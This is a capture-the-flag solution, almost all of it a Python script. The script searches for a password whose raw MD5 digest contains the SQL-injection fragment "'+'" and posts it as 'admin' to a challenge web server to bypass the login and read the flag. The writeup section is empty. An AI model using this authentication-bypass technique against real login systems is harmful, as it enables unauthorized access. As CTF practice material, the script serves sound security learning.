#### Goals
 * Get the flag

#### Solution
```python
#!/usr/bin/env python

import requests
import hashlib
import random
import string

def getMd5(word):
    m = hashlib.md5()
    m.update(word)
    return m.digest()

def getPassword():
    while True:
        password = ""
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        if "'+'" in getMd5(password):
            return password

print "[+] Searching password..."
password = getPassword()
print "[+] Found : [%s]" % (password)

url = "http://web.sniperoj.cn:10004/"
data = {
    "username": "admin",
    "password": password,
}
response = requests.post(url, data=data)
print "-" * 16
print "[+] Content : "
print response.content
print "-" * 16
print "[+] Headers : "
print response.headers
print "-" * 16
print "[+] Flag : "
print response.headers["flag"]
```

#### Writeups
 * TODO

